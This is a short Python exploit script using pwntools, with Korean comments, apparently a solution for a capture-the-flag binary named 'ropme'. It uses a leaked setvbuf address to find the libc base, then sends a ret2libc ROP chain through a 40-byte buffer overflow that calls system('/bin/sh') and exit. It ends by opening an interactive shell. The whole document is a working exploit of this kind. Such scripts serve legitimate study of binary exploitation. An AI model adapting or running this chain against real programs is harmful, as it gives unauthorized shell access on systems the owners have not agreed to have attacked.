from pwn import *

# 바이너리와 libc 로드
elf = ELF('./ropme')
libc = ELF('./libc.so.6')

# 디버깅을 위한 설정
context.log_level = 'debug'

# 프로세스 시작
p = process('./ropme')

# ROP 가젯 설정
POP_RDI = 0x4012a3
RET = POP_RDI + 1  # ret 가젯은 보통 pop rdi 다음에 있습니다

# setvbuf 주소 받기
setvbuf_addr = int(p.recvline().split()[-1], 16)
print(f"Leaked setvbuf address: {hex(setvbuf_addr)}")

# libc 베이스 계산
libc.address = setvbuf_addr - libc.symbols['setvbuf']
print(f"Calculated libc base: {hex(libc.address)}")

# 필요한 주소들 찾기
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))
exit_addr = libc.symbols['exit']

print(f"System address: {hex(system_addr)}")
print(f"/bin/sh address: {hex(binsh_addr)}")
print(f"Exit address: {hex(exit_addr)}")

# 페이로드 구성
payload = b'A' * 40                # 버퍼 오버플로우
payload += p64(RET)               # 스택 정렬을 위한 ret
payload += p64(POP_RDI)           # pop rdi ; ret
payload += p64(binsh_addr)        # /bin/sh 문자열 주소
payload += p64(system_addr)       # system 함수 호출
payload += p64(POP_RDI)           # pop rdi ; ret
payload += p64(0)                 # exit status
payload += p64(exit_addr)         # 정상 종료를 위한 exit 호출

# 페이로드 전송
p.clean()
p.sendline(payload)

# 쉘과 상호작용
p.interactive()